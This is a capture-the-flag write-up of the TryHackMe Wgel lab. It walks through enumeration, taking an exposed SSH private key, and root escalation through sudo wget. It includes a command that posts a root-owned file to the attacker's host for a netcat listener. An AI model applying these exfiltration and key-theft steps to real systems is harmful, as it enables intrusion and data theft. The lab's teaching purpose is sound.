# TryHackMe - Wgel CTF Room
<img width="551" alt="image" src="https://user-images.githubusercontent.com/114961392/207741896-ef3443f2-4269-40c7-a30e-8c9f1ac32ffa.png">

## Reconnaissance
Let's scan all ports with nmap. Ports 22 (SSH) and 80 (HTTP) are open so I will run a service and script scan on open ports.  

<img width="483" alt="image" src="https://user-images.githubusercontent.com/114961392/207742149-f84a4388-1f08-4e5d-9a85-7b3c11dbeb8b.png">

Let's check out the web page. It is just the standard default apache page. 

<img width="398" alt="image" src="https://user-images.githubusercontent.com/114961392/207742356-3446da4a-36ba-4156-816f-63b3e3531b94.png">

I will check the source code before I move on. There is something interesting towards the bottom of the page. Looks like a user name **Jessie**. Let's take a note of this.  

<img width="470" alt="image" src="https://user-images.githubusercontent.com/114961392/207742526-9ce77919-7027-414b-a67f-cfc477aad2e6.png">

Now let's try brute forcing hidden directories with dirsearch.  

<img width="473" alt="image" src="https://user-images.githubusercontent.com/114961392/207743217-dd7f45ba-09e6-4ac6-9179-e59ee8ea4b1b.png">

This reveals the **/sitemap** directory. You can get the same results with gobuster:  

<img width="593" alt="image" src="https://user-images.githubusercontent.com/114961392/207743340-86dcde32-7244-43d5-8fa6-850d3304ffd4.png">

Let's check out the /sitemap directory. We are presented with a basic website. There is nothing too interesting so I will do another dirsearch with this directory.  

<img width="476" alt="image" src="https://user-images.githubusercontent.com/114961392/207743774-0771ab80-3098-47af-b14c-03ee32591511.png">

## Exploitation
This has some interesting files! We can access the **.ssh** folder and copy their **id_rsa** then try access through SSH with the user name we learnt before.  

<img width="344" alt="image" src="https://user-images.githubusercontent.com/114961392/207744108-f3567a79-989d-42c0-9d1f-257805518670.png">

Remember to change the permissions to 400 on the id_rsa file before using it with SSH.  

<img width="409" alt="image" src="https://user-images.githubusercontent.com/114961392/207744429-6fe0c993-9ef5-4e7d-ab6f-ba3bfc20a729.png">

Wooshkah! We are in. Now we can go ahead and capture user flag in the Documents directory.  

<img width="234" alt="image" src="https://user-images.githubusercontent.com/114961392/207744737-e3094051-3815-47b8-8585-4a21f319e46a.png">

## Privilege Escalation
Let's type **sudo -l** to see what we can run as root.  

<img width="592" alt="image" src="https://user-images.githubusercontent.com/114961392/207745184-1a2e2f2e-96f6-467a-8a1f-eea17f30aa71.png">

Looks like we can run the binary, wget. This should be exploitable. After doing a quick google search for "exploiting wget", [this](https://vk9-sec.com/wget-privilege-escalation/) website has instructions on how to exploit for privilege escalation.  

<img width="1016" alt="image" src="https://user-images.githubusercontent.com/114961392/207745746-2cd61805-dfa4-478e-bc7f-04d4b40c0f7b.png">

I will use command:  
sudo wget --post-file=/root/root_flag.txt 10.4.2.215  
This posts the root flag file to my attack machine. Set up a netcat listener on port 80 to catch the connection.  

<img width="361" alt="image" src="https://user-images.githubusercontent.com/114961392/207746159-87857c9e-d569-4072-b88a-a58fbb5f646e.png">

<img width="311" alt="image" src="https://user-images.githubusercontent.com/114961392/207746187-5c4632fa-4b93-4973-99ad-a851668261bf.png">

We now have the root flag.
